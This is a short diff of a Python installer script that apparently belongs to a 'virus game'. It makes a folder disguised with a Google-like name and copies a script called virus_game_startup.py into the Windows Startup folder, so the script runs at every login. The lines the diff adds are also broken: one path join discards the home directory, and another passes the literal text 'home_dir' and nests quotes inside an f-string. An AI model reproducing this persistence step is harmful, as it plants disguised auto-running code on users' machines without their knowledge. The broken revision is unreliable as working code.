@@ -5,11 +5,11 @@ print("Starting installer...")
 
 home_dir = os.path.expanduser("~")
 print("Home dir is: ", home_dir)
-startup_folder = f"{home_dir}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".replace("/", "\\")
+startup_folder = os.path.join(home_dir, "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".replace("/", "\\"))
 
 print("Copying files...")
 # Create the directories
-os.system(f"mkdir {home_dir}/Downloads/Google_Stable_x64/assets/cache/".replace("/", "\\"))
+os.system(f"mkdir {os.path.join("home_dir/Downloads/Google_Stable_x64/assets/cache/".replace("/", "\\"))}")
 
 # Move everything to the place
 os.system(f"copy src\\virus_game_startup.py '{startup_folder}\\virus_game_startup.py'")
